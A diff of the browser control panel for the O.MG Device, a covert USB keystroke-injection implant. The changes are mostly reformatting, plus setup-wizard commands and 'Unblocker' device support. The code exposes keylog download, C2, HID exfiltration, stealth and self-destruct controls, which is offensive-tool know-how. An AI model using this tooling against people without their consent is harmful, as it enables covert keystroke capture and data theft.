@@ -1802,7 +1802,7 @@ DELAY 2000
 	</dialog>
 	<script>
 		// Global Variables
-		frontendVersionNumber = "3.0-240530";
+		frontendVersionNumber = "3.0-250509";
 		let debugLevel = "INFO";
 		let liveLogStatus = "off";
 		let keylogStatus = "0";
@@ -1817,22 +1817,23 @@ DELAY 2000
 		let previousUptime = Infinity;
 		let previousMAC = null;
 		let uicolor;
-
+		let zIndexCounter = 1;
+		
 		function getAddressParameter() {
 			const queryString = window.location.search;
 			const urlParams = new URLSearchParams(queryString);
 			return urlParams.has('backend') ? urlParams.get('backend') : null;
 		}
-
+		
 		const backendParam = getAddressParameter();
 		const hostnameMap = {
-			//  "localhost": connectCustomBackend(),
+		//  "localhost": connectCustomBackend(),
 		};
 		let hostname = backendParam || hostnameMap[window.location.hostname] || window.location.hostname;
-		if (hostname == "localhost") {
+		if(hostname == "localhost"){
 			hostname = "192.168.5.140";
 		}
-
+		
 		function connectCustomBackend() {
 			createDialog({
 				id: 'ipAddress',
@@ -1841,7 +1842,7 @@ DELAY 2000
 				closeEnabled: false,
 			});
 		}
-
+		
 		// Global Variables - Defaults
 		const readSize = 1024;
 		const blockSize = 4096;
@@ -1863,7 +1864,7 @@ DELAY 2000
 		var crc16 = "";
 		var previousLocale = "";
 		var activeEndLabel = "O.MG Device";
-
+		
 		// Feature Flags
 		const features = {
 			'global': {
@@ -1888,6 +1889,8 @@ DELAY 2000
 				'FR': 'Flash Read',
 				'FW': 'Flash Write',
 				'FX': 'Flash Write as Hex',
+				'FSGet': 'First Time Setup Wizard',
+				'FSSet': 'First Time Setup Wizard',
 			},
 			'syslog': {},
 			'payload': {
@@ -1929,7 +1932,7 @@ DELAY 2000
 				'CU': 'USB Enumeration Enable/Disable',
 			}
 		};
-
+		
 		const typeMap = {
 			'a': ['* to USB-A Cable', 'red'],
 			'b': ['Unblocker', 'red'],
@@ -1939,7 +1942,7 @@ DELAY 2000
 			't': ['A to C Adapter', 'red'],
 			'default': ['O.MG Device', 'grey'],
 		};
-
+		
 		const modelMap = {
 			'c': ['Basic', 'BASIC'],
 			'k': ['Plus', 'PLUS'],
@@ -1947,7 +1950,7 @@ DELAY 2000
 			'e': ['Elite', 'ELITE'],
 			'default': ['O.MG Device', 'ERROR'],
 		};
-
+		
 		const featureFlagMap = {
 			'pc': ['global', 'syslog', 'debug', 'payload'],
 			'bd': ['global', 'syslog', 'debug', 'payload', 'c2', 'hidx', 'stealth'],
@@ -1957,7 +1960,7 @@ DELAY 2000
 			'k': ['global', 'syslog', 'debug', 'payload', 'keylog', 'stealth'],
 			'e': ['global', 'syslog', 'debug', 'payload', 'keylog', 'c2', 'hidx', 'stealth'],
 		};
-
+		
 		function generateModifiers() {
 			const groups = {
 				0x01: ['CONTROL', 'CTRL'],
@@ -1968,26 +1971,26 @@ DELAY 2000
 			const leftPrefixes = ['', 'L', 'LEFT', 'LEFT-'];
 			const rightPrefixes = ['', 'R', 'RIGHT', 'RIGHT-'];
 			const modifiers = {};
-
+		
 			Object.entries(groups).forEach(([value, names]) => {
 				const leftValue = '0x0' + parseInt(value, 16).toString(16).toUpperCase();
 				const rightValue = '0x' + (parseInt(value, 16) << 4).toString(16).toUpperCase();
-
+		
 				names.forEach(name => {
 					leftPrefixes.forEach(prefix => {
 						modifiers[prefix + name] = leftValue;
 					});
-
+		
 					rightPrefixes.forEach(prefix => {
 						modifiers[prefix + name] = rightValue;
 					});
 				});
 			});
-
+		
 			return modifiers;
 		}
 		const modifiers = generateModifiers();
-
+		
 		var modifiersInverted = {
 			0x01: 'LEFT-CTRL',
 			0x02: 'LEFT-SHIFT',
@@ -1998,7 +2001,7 @@ DELAY 2000
 			0x40: 'RIGHT-ALT',
 			0x80: 'RIGHT-GUI',
 		};
-
+		
 		// On-Load Config
 		document.addEventListener("DOMContentLoaded", async function(event) {
 			document.getElementById('debugLevel').value = debugLevel;
@@ -2026,11 +2029,11 @@ DELAY 2000
 			}
 			window.addEventListener('resize', appHeight);
 			appHeight();
-
+		
 			const payloadSelect = document.getElementById('payloadSelect');
 			const saveBootableButton = document.getElementById('payload-bootableToggle');
 			document.getElementById('searchGithubPayloads').addEventListener('keydown', searchGithubPayloads);
-
+		
 			payloadSelect.addEventListener('input', function() {
 				if (payloadSelect.value === bootpair) {
 					saveBootableButton.classList.add('active');
@@ -2038,35 +2041,35 @@ DELAY 2000
 					saveBootableButton.classList.remove('active');
 				}
 			});
-
+		
 			var payloadEditor = document.getElementById('payload');
 			var payloadEditorChangeTimeout = null;
 			payloadEditor.addEventListener('input', function() {
 				if (payloadEditorChangeTimeout) {
 					clearTimeout(payloadEditorChangeTimeout);
 				}
-
+		
 				payloadEditorChangeTimeout = setTimeout(function() {
 					payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
 					payloadEditorSavedElement.innerHTML = "Edited";
 					compileDuckyScript();
 				}, 2000);
 			});
-
+		
 			const colorSlider = document.querySelector("#color-slider");
 			const colorBox = document.querySelector("#color-box");
 			const applyButton = document.querySelector("#apply-color");
-
+		
 			colorSlider.addEventListener("input", function() {
 				const hue = colorSlider.value;
 				colorBox.style.backgroundColor = `hsl(${hue}, 100%, 50%)`;
 				setAccentColors(hue);
 			});
-
+		
 			applyButton.addEventListener("click", function() {
 				sendMessage(`CTSet\tuicolor\t${colorSlider.value}`);
 			});
-
+		
 		});
 		document.onvisibilitychange = function() {
 			logMessage(`WARN`, `Browser Visibility Change Detected: [visibilityState]:[${document.visibilityState}]`);
@@ -2077,11 +2080,11 @@ DELAY 2000
 				checkWebSocketStatus();
 			}
 		};
-
+		
 		// Data Transform
 		const toHex = (() => {
 			let cache = {};
-
+		
 			const memoizedFunction = (number, size = 2) => {
 				const key = number + ',' + size;
 				if (cache[key]) {
@@ -2094,40 +2097,40 @@ DELAY 2000
 				}
 				while (b1.length < size) b1 = '0' + b1;
 				const result = b1.toUpperCase();
-
+		
 				logMessage(`DEBUG`, `toHex: [number]:[${number}] [b1]:[${b1}] [size]:[${size}]`);
-
+		
 				if (result === undefined || result === null) {
 					console.log("No matching value for key: ", key);
 					return;
 				}
-
+		
 				cache[key] = result;
 				return result;
 			};
-
+		
 			memoizedFunction.invalidateCache = () => {
 				cache = {};
 			};
-
+		
 			return memoizedFunction;
 		})();
-
+		
 		function padHex(num) {
 			return num.toString(16).padStart(2, '0');
 		}
-
+		
 		function padInput(value, length) {
 			value = String(value);
 			let len = parseInt(length);
-
+		
 			if (isNaN(len) || len <= value.length) {
 				return value;
 			}
-
+		
 			return value.padStart(len, '0');
 		}
-
+		
 		function asciiToHex(str) {
 			var arr1 = [];
 			for (var n = 0, l = str.length; n < l; n++) {
@@ -2136,7 +2139,7 @@ DELAY 2000
 			}
 			return arr1.join('');
 		}
-
+		
 		function unescapeHtml(html) {
 			const entitiesMap = {
 				'&lt;': '<',
@@ -2146,16 +2149,16 @@ DELAY 2000
 				'&apos;': "'",
 				'&nbsp;': ' '
 			};
-
+		
 			return html.replace(/&lt;|&gt;|&amp;|&quot;|&apos;|&nbsp;/g, (matched) => {
 				return entitiesMap[matched];
 			});
 		}
-
+		
 		function crc16augccitt(str) {
 			let crc = 0x1D0F;
 			let polynomial = 0x1021;
-
+		
 			for (let i = 0; i < str.length; i++) {
 				let byte = str.charCodeAt(i);
 				for (let j = 0; j < 8; j++) {
@@ -2165,58 +2168,58 @@ DELAY 2000
 					if (c15 ^ bit) crc ^= polynomial;
 				}
 			}
-
+		
 			crc &= 0xffff;
 			return crc.toString(16).toUpperCase();
 		}
-
-
+		
+		
 		function bigEndianToLittleEndian(hexString) {
 			if (hexString.length % 2 !== 0) {
 				console.error('Invalid hex string length. It must be a multiple of 2.');
 				return null;
 			}
-
+		
 			let littleEndian = '';
 			for (let i = 0; i < hexString.length; i += 2) {
 				littleEndian = hexString.substring(i, i + 2) + littleEndian;
 			}
-
+		
 			return littleEndian;
 		}
-
+		
 		function extractArg(args, pattern) {
 			const match = args.match(pattern);
 			return match ? match[1] : null;
 		}
-
+		
 		function sleep(ms) {
 			return new Promise(resolve => setTimeout(resolve, ms));
 		}
-
+		
 		function toggleClassBasedOnStatus(elementId, className, status, desiredStatus) {
 			let element = document.getElementById(elementId);
-
+		
 			if (status === desiredStatus && !element.classList.contains(className)) {
 				element.classList.add(className);
 			} else if (status !== desiredStatus && element.classList.contains(className)) {
 				element.classList.remove(className);
 			}
 		}
-
+		
 		function toggleModule(moduleName, openClose) {
 			const moduleElement = document.getElementById(moduleName);
 			const isVisible = moduleElement.classList.contains('visible');
 			const shouldOpen = openClose === "open" ? true : (openClose === "close" ? false : !isVisible);
-
+		
 			toggleVisibility(moduleElement, shouldOpen);
 		}
-
+		
 		function toggleVisibility(element, isVisible) {
 			element.classList.toggle('visible', isVisible);
 			element.classList.toggle('hidden', !isVisible);
 		}
-
+		
 		function toggleClass(id, class1, class2) {
 			const element = document.getElementById(id);
 			if (element) {
@@ -2224,7 +2227,7 @@ DELAY 2000
 				element.classList.add(class2);
 			}
 		}
-
+		
 		function toggleClassVisibility(id, visibleClassName, isVisible) {
 			const element = document.getElementById(id);
 			if (element) {
@@ -2232,33 +2235,33 @@ DELAY 2000
 				element.classList.toggle('hidden', !isVisible);
 			}
 		}
-
+		
 		function setElementInnerHTML(id, html) {
 			const element = document.getElementById(id);
 			if (element) {
 				element.innerHTML = html;
 			}
 		}
-
+		
 		function setElementValue(id, value, prop = 'value') {
 			const element = document.getElementById(id);
 			if (element) {
 				element[prop] = value;
 			}
 		}
-
+		
 		function modal(moduleName, mode) {
 			const targetModule = moduleName === "modal" ? moduleName : `${moduleName}Modal`;
 			toggleModule(targetModule, mode);
 		}
-
+		
 		function modalCreate(label, message) {
 			setElementInnerHTML("modalLabel", label);
 			setElementInnerHTML("modalMessage", message);
 			toggleModalVisibility(true);
 			toggleModule("modal", "open");
 		}
-
+		
 		function toggleModalVisibility(visible) {
 			const modal = document.getElementById('modal');
 			if (modal) {
@@ -2266,7 +2269,7 @@ DELAY 2000
 				modal.classList.toggle('visible', visible);
 			}
 		}
-
+		
 		function colorNameToHue(colorName) {
 			const colors = {
 				red: 5,
@@ -2283,14 +2286,14 @@ DELAY 2000
 				brown: 20,
 				grey: 0,
 			};
-
+		
 			return colors[colorName.toLowerCase()] || 0;
 		}
-
+		
 		function setAccentColors(hue) {
 			const uiAccentColorMenuSelect = document.getElementById('uiAccentColor');
 			const r = document.querySelector(':root');
-
+		
 			if (!isNaN(hue) && hue >= 0 && hue <= 360) {
 				hslHue = hue;
 				customColor = true;
@@ -2298,7 +2301,7 @@ DELAY 2000
 				hslHue = colorNameToHue(hue);
 				customColor = false;
 			}
-
+		
 			if (hue == "grey") {
 				hslSat = "0";
 			} else if (hue == "brown") {
@@ -2306,11 +2309,11 @@ DELAY 2000
 			} else {
 				hslSat = "75";
 			}
-
+		
 			r.style.setProperty('--accentColor', `hsl(${hslHue}, ${hslSat}%, 32%)`);
 			r.style.setProperty('--accentGradient1', `hsl(${hslHue}, ${hslSat}%, 23%)`);
 			r.style.setProperty('--accentGradient2', `hsl(${hslHue}, ${hslSat}%, 41%)`);
-
+		
 			if (uiAccentColorMenuSelect && customColor == false) {
 				uiAccentColorMenuSelect.value = hue;
 			} else {
@@ -2319,7 +2322,7 @@ DELAY 2000
 				uiAccentColorMenuSelect.value = hue;
 			}
 		}
-
+		
 		function hideElementsByClass(...classNames) {
 			classNames.forEach((className) => {
 				const elements = document.querySelectorAll('.' + className);
@@ -2328,44 +2331,44 @@ DELAY 2000
 				}
 			});
 		}
-
+		
 		function updateElementValue(id, value, prop = 'value') {
 			const element = document.getElementById(id);
 			if (element) element[prop] = value;
 		}
-
+		
 		function setRadioChecked(id) {
 			const element = document.getElementById(id);
 			if (element) {
 				element.checked = true;
 			}
 		}
-
+		
 		function processType(type) {
 			return typeMap[type] || typeMap['default'];
 		}
-
+		
 		function processModel(model) {
 			return modelMap[model] || modelMap['default'];
 		}
-
+		
 		function contentAreaToggle(moduleName) {
 			const modules = ["keylog", "payload", "syslog", "c2log", "debug"];
-
+		
 			if (moduleName === "keylog") {
 				downloadKeylog('1');
 			}
-
+		
 			modules.forEach(module => {
 				document.getElementById(`contentArea_${module}`).classList.remove(`visible`);
 				document.getElementById(`contentArea_${module}`).classList.add(`hidden`);
 				document.getElementById(`contentSubNav_${module}`).classList.remove(`buttonSelected`);
 			});
-
+		
 			document.getElementById(`contentArea_${moduleName}`).classList.replace(`hidden`, `visible`);
 			document.getElementById(`contentSubNav_${moduleName}`).classList.add(`buttonSelected`);
 		}
-
+		
 		function sidebarSettingsAreaToggle(moduleName) {
 			document.getElementById(`sidebar_settings_queue`).classList.remove(`visible`);
 			document.getElementById(`sidebar_settings_net`).classList.remove(`visible`);
@@ -2384,7 +2387,7 @@ DELAY 2000
 			document.getElementById(`sidebarNav_${moduleName}`).classList.remove(`buttonSelected`);
 			document.getElementById(`sidebarNav_${moduleName}`).classList.add(`buttonSelected`);
 		}
-
+		
 		function sidebarAreaToggle(moduleName) {
 			if (moduleName != "close") {
 				if (document.getElementById(`sidebar_${moduleName}`).classList.contains(`visible`)) {
@@ -2419,7 +2422,7 @@ DELAY 2000
 				document.getElementById(`subnav`).classList.add(`subnavFullscreen`);
 			}
 		}
-
+		
 		function toggleSignalBars(elements, state) {
 			elements.forEach(element => {
 				const el = document.getElementById(element);
@@ -2427,45 +2430,43 @@ DELAY 2000
 				el.classList.add(state);
 			});
 		}
-
+		
 		function downloadFile(elementId, fileName, redactPasswords = true) {
 			logMessage(`CRIT`, `${fileName}`);
 			let text = document.getElementById(elementId).value;
-
+		
 			if (redactPasswords) {
 				const wifipass = document.getElementById('device-WIFIPassword').value;
 				const re = new RegExp(wifipass.replace(/[.*+\-?^${}()|[\]\\]/g, '\\$&'), 'g');
 				text = text.replace(re, '********');
 			}
-
-			const textFileAsBlob = new Blob([text], {
-				type: 'text/plain'
-			});
+		
+			const textFileAsBlob = new Blob([text], { type: 'text/plain' });
 			const downloadLink = document.createElement("a");
 			downloadLink.download = `${fileName}.txt`;
 			downloadLink.innerHTML = "Download File";
-
+		
 			const createObjectURL = window.webkitURL ? window.webkitURL.createObjectURL : window.URL.createObjectURL;
 			downloadLink.href = createObjectURL(textFileAsBlob);
-
+		
 			if (!window.webkitURL) {
 				downloadLink.onclick = destroyClickedElement;
 				downloadLink.style.display = "none";
 				document.body.appendChild(downloadLink);
 			}
-
+		
 			downloadLink.click();
 		}
-
+		
 		function downloadModal() {
 			const modalName = document.getElementById('modalLabel').innerHTML;
 			downloadFile('modalMessage', `${modalName}-log`);
 		}
-
+		
 		function saveKeylog() {
 			downloadFile('keylog', 'keylog');
 		}
-
+		
 		async function toggleFeatureFlags() {
 			enabledFeatures = [];
 			if (!featureFlags) {
@@ -2481,13 +2482,16 @@ DELAY 2000
 			logMessage(`CRIT`, `Supported Features: ${enabledFeatures}`);
 			await generateDebugMenu();
 		}
-
+		
 		function applyFeatureFlags(type, model) {
-			const key = type === 'p' ? type + model : model;
+			const key = (type === 'p' || type === 'b') ? type + model : model;
 			featureFlags = featureFlagMap[key] || [];
-
+			
 			if (type === 'p' && model === 'c') { // Plug Basic
 				hideElementsByClass('selfDestruct', 'keylog', 'c2', 'hidx');
+			}
+			if (type === 'b' && model === 'd') { // Unblocker Elite
+				hideElementsByClass('keylog');
 			}
 			if (type === 'p' && model === 'd') { // Plug Elite
 				hideElementsByClass('keylog');
@@ -2498,45 +2502,51 @@ DELAY 2000
 			if (model === 'k') { // Plus Cable
 				hideElementsByClass('c2', 'hidx');
 			}
+			if (type === 'a' || type === 'c' || type === 'd') {
+				hideElementsByClass('plugIcon', 'blockerIcon'); // Cable
+			}
+			if (type === 'b' || type === 't') {
+				hideElementsByClass('plugIcon', 'cableIcon'); // Unblocker / Adapter
+			}
+			if (type === 'p') {
+				hideElementsByClass('cableIcon', 'blockerIcon'); // Plug
+			}
 		}
-
+		
 		const parseData = (data) => {
 			response = data;
 			parameters = response.split("\t");
-			return {
-				response,
-				parameters
-			};
+			return { response, parameters };
 		};
-
+		
 		const updateElements = (elementMap) => {
 			for (const [elementId, value] of Object.entries(elementMap)) {
 				updateElement(elementId, value);
 			}
 		};
-
+		
 		function setElementValues(elementValues, domElement = null, activeClassElements = [], toggleClassElements = []) {
 			const valueElements = ['INPUT', 'SELECT', 'OPTION', 'TEXTAREA'];
 			const innerHtmlElements = ['DIV', 'SPAN', 'P', 'LI', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'DATA'];
-
+		
 			for (const [elementId, item] of Object.entries(elementValues)) {
 				const element = document.getElementById(elementId);
-
+		
 				if (!element) {
 					console.warn(`Element with ID: [${elementId}] not found in the DOM.`);
 					continue;
 				}
-
+		
 				let value;
 				let updateMethod;
-
+		
 				if (typeof item === 'object' && item !== null && 'value' in item && 'method' in item) {
 					value = item.value;
 					updateMethod = item.method;
 					element[updateMethod] = value;
 				} else {
 					value = item;
-
+		
 					if (domElement) {
 						updateMethod = domElement;
 					} else {
@@ -2546,35 +2556,35 @@ DELAY 2000
 							updateMethod = 'innerHTML';
 						}
 					}
-
+		
 					if (updateMethod) {
 						element[updateMethod] = value;
 					} else {
 						console.warn(`Unable to determine update method for element: [elementId]:[${elementId}]. Provided domElement: [${domElement}], element's tagName: [${element.tagName}]. Check if the tagName is supported or the provided domElement parameter is valid.`);
 					}
 				}
-
+		
 				if (activeClassElements.includes(elementId)) {
 					element.classList[value === "1" ? 'add' : 'remove']('active');
 				}
-
+		
 				if (toggleClassElements.hasOwnProperty(elementId)) {
 					element.classList.toggle(toggleClassElements[elementId]);
 				}
 			}
 		}
-
+		
 		function setElementChecked(id, isChecked) {
 			const element = document.getElementById(id);
 			if (element) {
 				element.checked = isChecked;
 			}
 		}
-
+		
 		const sendCommands = (commands) => {
 			commands.forEach(command => sendMessage(command));
 		};
-
+		
 		const handleKey = (key, value, action) => {
 			const elementId = key.split('"')[1];
 			const elementValue = value.split(':')[1].replace(/"/g, '').trim();
@@ -2584,18 +2594,20 @@ DELAY 2000
 				updateElement(elementId, elementValue);
 			}
 		};
-
+		
 		function viewDialog(id, action) {
 			var dialog = document.getElementById(id);
-
+		
 			if (!dialog) {
 				if (action !== "remove") {
 					console.error("No dialog found with id:", id);
 				}
 				return;
 			}
-
-			if (action === "open") {
+		
+			if (action === "blockingOpen") {
+				dialog.showModal();
+			} else if (action === "open") {
 				dialog.setAttribute("open", "");
 				dialog.removeAttribute("close");
 			} else if (action === "close") {
@@ -2607,21 +2619,15 @@ DELAY 2000
 				console.error("Invalid action:", action);
 			}
 		}
-
-		function createDialog({
-			id,
-			title = '',
-			description = '',
-			action = null,
-			closeEnabled = true
-		}) {
+		
+		function createDialog({ id, title = '', description = '', action = null, closeEnabled = true }) {
 			let dialog = document.getElementById(id);
-
+		
 			if (!dialog) {
 				dialog = document.createElement('dialog');
 				dialog.id = id;
 				dialog.classList.add('general-dialog');
-
+		
 				if (closeEnabled) {
 					const closeButton = document.createElement('button');
 					closeButton.textContent = 'X';
@@ -2631,45 +2637,45 @@ DELAY 2000
 					});
 					dialog.appendChild(closeButton);
 				}
-
+		
 				if (title) {
 					const dialogTitle = document.createElement('h2');
 					dialogTitle.textContent = title;
 					dialog.appendChild(dialogTitle);
 				}
-
+		
 				if (description) {
 					const dialogDescription = document.createElement('div');
 					dialogDescription.innerHTML = description;
 					dialog.appendChild(dialogDescription);
 				}
-
+		
 				if (action) {
 					const dialogAction = document.createElement('button');
 					dialogAction.textContent = action.text || 'OK';
 					dialogAction.addEventListener('click', action.callback || (() => {}));
 					dialog.appendChild(dialogAction);
 				}
-
+		
 				document.body.appendChild(dialog);
 			}
-
+		
 			if (!dialog.open) {
 				dialog.showModal();
 			}
-
+		
 			return dialog;
 		}
-
+		
 		// Process Message Responses
 		function processOnMessage(responseText, responseHex) {
 			lastMessage = Date.now();
 			responseTextParams = responseText.split("\t");
-
+		
 			if (responseTextParams[0] != "CTList") {
 				logMessage("DEBUG", `WebSocket Message Received: [response]:[${responseText}]`);
 			}
-
+		
 			switch (responseTextParams[0]) {
 				case responseTextParams[0].match(/\[custom\]/)?.input:
 					apiResponseCustom(responseText);
@@ -2799,6 +2805,9 @@ DELAY 2000
 					break;
 				case "E":
 					break;
+				case "FSGet":
+					apiResponseFSGet(responseText);
+					break;
 				case "SFRead":
 					apiResponseSFRead(responseText);
 					break;
@@ -2813,24 +2822,21 @@ DELAY 2000
 					break;
 			}
 		}
-
+		
 		function issueCustomCommand() {
 			const cmd = document.getElementById('customCommandInput').value;
 			logMessage('INFO', `issueCustomCommand: [cmd]:[${cmd}]`);
 			sendMessage(`[custom]${cmd}`);
 		}
-
+		
 		function apiResponseCustom(data) {
 			data = data.replace("[custom]", "");
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			logMessage('CRIT', `issueCustomCommand: [response]:[${response}] [parameters]:[${parameters}]`);
 			updateElementValue('customCommandOutput', parameters, 'value');
 		}
-
+		
 		let prevDataCTList = null;
 		const apiResponseCTList = (data) => {
 			if (data === prevDataCTList) {
@@ -2852,54 +2858,54 @@ DELAY 2000
 				}
 				return;
 			}
-
+		
 			prevDataCTList = data;
 			let uicolorExists = false;
 			let splitData = data.split('\t');
 			let listName = splitData[0];
 			let jsonData = splitData[1];
 			let jsonObject = JSON.parse(jsonData);
-
+		
 			for (let key in jsonObject) {
 				if (key == "bootpair") {
 					bootpair = jsonObject[key];
 					document.getElementById('bootscriptPair').value = bootpair;
 				}
-
+		
 				if (key == "bootscript" && jsonObject[key] !== '0') {
 					document.getElementById(`toggle-BootScript`).classList.add(`active`);
 					document.getElementById(`toggle-BootScriptFileMenu`).classList.add(`active`);
 				}
-
+		
 				if (key == "bootscript" && jsonObject[key] == '0') {
 					document.getElementById(`toggle-BootScript`).classList.remove(`active`);
 					document.getElementById(`toggle-BootScriptFileMenu`).classList.remove(`active`);
 				}
-
+		
 				if (key == "wifimac") {
 					wifimac = document.getElementById('device-CustomMACAddress');
 					wifimac.value = jsonObject[key];
 				}
-
+		
 				if (key == "devicename") {
 					devicename = document.getElementById('device-name');
 					devicename.value = jsonObject[key];
 				}
-
+				
 				if (key == "hidxhost") {
 					hidxhost = document.getElementById('hidxhost');
 					hidxhost.value = jsonObject[key];
 				}
-
+		
 				if (key == "hidxport") {
 					hidxport = document.getElementById('hidxport');
 					hidxport.value = jsonObject[key];
 				}
-
+		
 				if (key == "hidxboot") {
 					document.getElementById(`hidxboot`).classList.add(`active`);
 				}
-
+		
 				if (key == "showmsgtime") {
 					alwaysDisplayLastPoll = elementValue;
 					const toggleElems = ['c2logAlwaysShow'];
@@ -2914,11 +2920,11 @@ DELAY 2000
 						}
 					});
 				}
-
+		
 				if (key == "slotmode") {
 					slotmode = jsonObject[key];
 				}
-
+		
 				if (key == "uicolor") {
 					customColor = document.getElementById('uicolorCustom');
 					customColor.value = jsonObject[key];
@@ -2927,23 +2933,23 @@ DELAY 2000
 					setAccentColors(jsonObject[key]);
 					uicolorExists = true;
 				}
-
+		
 				if (key == "usbinterval") {
 					usbinterval = document.getElementById('experimentalSpeed');
 					usbinterval.value = jsonObject[key];
 				}
-
+				
 				if (key == "keylogall") {
 					if (jsonObject[key] == "1") {
 						document.getElementById(`keylogDisplayUnmappedValues`).classList.add(`active`);
 					}
 				}
 			}
-
+		
 			if (!uicolorExists) {
 				const deviceModel = document.getElementById('device-Model').innerHTML;
 				const deviceType = document.getElementById('device-Type').innerHTML;
-
+		
 				if (deviceModel == "c" && deviceType == "p") {
 					sendMessage(`CTSet\tuicolor\tblue`);
 					setAccentColors("blue");
@@ -2953,15 +2959,12 @@ DELAY 2000
 				}
 			}
 		}
-
+		
 		let globalJson = {};
 		let resolveFunction = null;
-
+		
 		function apiResponseCFList(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			logMessage('DEBUG', `apiResponseCFList: [data]:[${response}]`);
 			updateElement('response-CFList', response);
 			const json = JSON.parse(parameters[1]);
@@ -2980,18 +2983,21 @@ DELAY 2000
 				return Promise.resolve();
 			}
 		}
-
+		
 		function processCFListData() {
 			const CFListResults = document.getElementById("CFListResults");
 			CFListResults.innerHTML = "";
 			const payloadList = document.getElementById("payload-list");
 			payloadList.innerHTML = "";
-
+			const payloadSelect = document.getElementById("payloadSelect");
+			payloadSelect.innerHTML = "";
+		
+		
 			Object.entries(globalJson).forEach(([key, value]) => {
 				const label = document.createElement("label");
 				label.for = key;
 				label.innerText = `cflist: ${key}`;
-
+		
 				const name = document.createElement("input");
 				name.id = key;
 				name.name = parseInt(value[0], 10);
@@ -3001,10 +3007,12 @@ DELAY 2000
 				if (key.startsWith("payload")) {
 					const option = document.createElement("option");
 					option.value = key;
+					option.innerHTML = key;
 					payloadList.appendChild(option);
+					payloadSelect.appendChild(option);
 				}
 			});
-
+		
 			let payloadSlotAvailable = 0;
 			for (let key in globalJson) {
 				if (key.startsWith("bootscript") || key.startsWith("payload") || key.startsWith("exec") || key.startsWith("keylog") || key.startsWith("plcache") || key.startsWith("hidxfile") || key.startsWith("<free>")) {
@@ -3012,68 +3020,50 @@ DELAY 2000
 				}
 			}
 			const elementIds = {
-				'partitionEditorAvailable': {
-					value: payloadSlotAvailable,
-					method: 'value'
-				},
+				'partitionEditorAvailable': { value: payloadSlotAvailable, method: 'value' },
 			};
 			setElementValues(elementIds);
-
+			
 			updateElement('response-CFList', JSON.stringify(globalJson));
 			globalJson = {};
 		}
-
+		
 		let prevDataCI = null;
-
+		
 		function apiResponseCI(data) {
 			if (data === prevDataCI) {
 				return;
 			}
 			prevDataCI = data;
-
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+		
+			const { response, parameters } = parseData(data);
+		
 			if (parseFloat(parameters[6]) < previousUptime || parameters[1] !== previousMAC) {
 				viewDialog('ipAddress', 'remove');
 				if (parameters[1] !== previousMAC && previousMAC != null) {
 					toggleModalVisibility(true);
-
+		
 					const modalLabel = "Warning";
 					const modalMessage = `Device MAC Address has changed. WebUI will reload in 10 seconds. If you did not intend this, check that you do not have multiple O.MG Devices operating on the same SSID and IP Address.`;
-
+		
 					setElementValues({
 						"modalLabel": modalLabel,
 						"modalMessage": modalMessage
 					});
-
+		
 					setTimeout(function() {
 						location.reload(true);
 					}, 10000);
 				}
-
+		
 				const elementIds = {
-					'response-CI': {
-						value: response,
-						method: 'value'
-					},
-					'device-HardwareMACAddress': {
-						value: parameters[1],
-						method: 'innerHTML'
-					},
-					'device-FlashSize': {
-						value: parameters[2],
-						method: 'value'
-					},
-					'device-Uptime': {
-						value: parameters[6],
-						method: 'value'
-					},
+					'response-CI': { value: response, method: 'value' },
+					'device-HardwareMACAddress': { value: parameters[1], method: 'innerHTML' },
+					'device-FlashSize': { value: parameters[2], method: 'value' },
+					'device-Uptime': { value: parameters[6], method: 'value' },
 				};
 				setElementValues(elementIds);
-
+		
 				const restartReasons = {
 					'0': 'Normal Startup By Power On',
 					'1': `Hardware Watchdog Reset ${parameters[4]} ${parameters[5]} ${parameters[7]} ${parameters[8]}`,
@@ -3083,149 +3073,117 @@ DELAY 2000
 					'5': 'Wake from Deep-Sleep',
 					'6': 'External System Reset',
 				};
-
+		
 				const restartReason = restartReasons[parameters[3]] || 'Unknown Restart Reason';
 				logMessage('INFO', `Connection Established: [Uptime]:[${parameters[6]} seconds - ${restartReason}]`, 'Connection Established');
 				viewDialog(`partitionApplied`, `close`);
-
+		
 				previousUptime = parseFloat(parameters[6]);
 				previousMAC = parameters[1];
 			}
 		}
-
+		
 		let prevDataCNGet = null;
-
+		
 		function apiResponseCNGet(data) {
 			if (data === prevDataCNGet) {
 				return;
 			}
 			prevDataCNGet = data;
-
-			const {
-				response,
-				parameters
-			} = parseData(data);
+		
+			const { response, parameters } = parseData(data);
 			logMessage('CRIT', `apiResponseCNGet: [data]:[${response}]`);
-
+		
 			const elementIds = {
-				'response-CNGet': {
-					value: response,
-					method: 'value'
-				},
-				'device-USBVID': {
-					value: parameters[1],
-					method: 'value'
-				},
-				'device-USBPID': {
-					value: parameters[2],
-					method: 'value'
-				},
-				'device-USBMAN': {
-					value: parameters[3],
-					method: 'value'
-				},
-				'device-USBPRO': {
-					value: parameters[4],
-					method: 'value'
-				},
-				'device-USBSER': {
-					value: parameters[5],
-					method: 'value'
-				},
+				'response-CNGet': { value: response, method: 'value' },
+				'device-USBVID': { value: parameters[1], method: 'value' },
+				'device-USBPID': { value: parameters[2], method: 'value' },
+				'device-USBMAN': { value: parameters[3], method: 'value' },
+				'device-USBPRO': { value: parameters[4], method: 'value' },
+				'device-USBSER': { value: parameters[5], method: 'value' },
 			};
-
+		
 			setElementValues(elementIds);
 		}
-
+		
 		let intervalIdCPGet = null;
-
+		
 		function apiResponseCPGet(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
+			const { response, parameters } = parseData(data);
 			const isCPGet = response === "CPGet\t";
-
+		
 			setElementValues({
 				'response-CPGet': isCPGet ? '' : response,
 				'calibrationStatusViewer': isCPGet ? 'Generating Calibration Data. Please Wait.' : response
 			});
-
+		
 			if (isCPGet && !intervalIdCPGet) {
 				intervalIdCPGet = setInterval(() => sendMessage('CPGet'), 1000);
 			} else if (!isCPGet && intervalIdCPGet) {
 				clearInterval(intervalIdCPGet);
 				intervalIdCPGet = null;
 			}
-
+		
 			logMessage('CRIT', `apiResponseCPGet: [data]:[${response}]`);
 		}
-
+		
 		async function readCalibrationText(event) {
 			const file = event.target.files.item(0);
 			const text = await file.text();
 			calibrationData(text);
 		}
-
+		
 		function calibrationData(data) {
 			logMessage(`CRIT`, `CalibrationData: [file]:[${data}]`);
 			sendMessage(`CO${data}`);
 		}
-
+		
